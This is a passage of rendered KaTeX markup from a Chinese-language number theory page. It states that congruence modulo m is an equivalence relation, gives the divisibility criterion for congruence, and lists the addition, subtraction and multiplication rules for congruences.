stretchy="false">)</mo><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>b</mi><mo>≡</mo><mi>c</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><mi>a</mi><mo>≡</mo><mi>c</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mtext>   </mtext><mo stretchy="false">(</mo><mtext>传递性</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}整数对模m的同余关系是一个等价关系，即\\(1)a\equiv a(mod~m)~~~(自反性)\\(2)若a\equiv b(mod~m),则b\equiv a(mod~m)~~~(对称性)\\(3)若a\equiv b(mod~m),b\equiv c(mod~m),则a\equiv c(mod~m)~~~(传递性)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.800000000000001em;vertical-align:-2.1500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">价</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">即</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord cjk_fallback">自</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">性</span><span class="mclose">)</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">性</span><span class="mclose">)</span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">3</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">递</span><span class="mord cjk_fallback">性</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>定理1</strong>：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>整数</mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mtext>对模</mtext><mi>m</mi><mtext>同余的充要条件是</mtext><mi>m</mi><mo>∣</mo><mi>a</mi><mo>−</mo><mi>b</mi><mtext>，即</mtext><mi>a</mi><mo>=</mo><mi>b</mi><mo>+</mo><mi>m</mi><mi>t</mi><mtext>，</mtext><mi>t</mi><mo>∈</mo><mi>Z</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}整数a,b对模m同余的充要条件是m\mid a-b，即a=b+mt，t∈Z\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">充</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">即</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p></blockquote><ul><li>由命题1和定理1就能推导出同余的运算法则，进而导出命题2、命题3</li></ul><blockquote><p><strong>命题2</strong>：命题2得到的就是同余的加减运算</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>若</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>≡</mo><msub><mi>b</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>b</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">;</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mtext>若</mtext><mi>a</mi><mo>+</mo><mi>b</mi><mo>≡</mo><mi>c</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><mi>a</mi><mo>≡</mo><mi>c</mi><mo>−</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}(1)若a_1\equiv b_1(mod~m),a_2\equiv b_2(mod~m),则a_1+a_2\equiv b_1+b_2(mod~m);\\(2)若a+b\equiv c(mod~m),则a\equiv c-b(mod~m)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">;</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>命题3</strong>：命题3得到的是同余的乘法运算</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>≡</mo><msub><mi>b</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>b</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mtext>，则</mtext><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>b</mi><mn>1</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>特别地：</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><mi>a</mi><mi>k</mi><mo>≡</mo><mi>b</mi><mi>k</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><msup><mi>a</mi><mi>n</mi></msup><mo>≡</mo><msup><mi>b</mi><mi>n</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}若a_1\equiv b_1(mod~m),a_2\equiv b_2(mod~m)，则a_1a_2\equiv b_1b_2(mod~m)\\特别地：\\(1)若a\equiv b(mod~m),则ak\equiv bk(mod~m)\\(2)若a\equiv b(mod~m),则a^n\equiv b^n(mod~m)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.800000000000001em;vertical-align:-2.1500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">别</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">：</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" 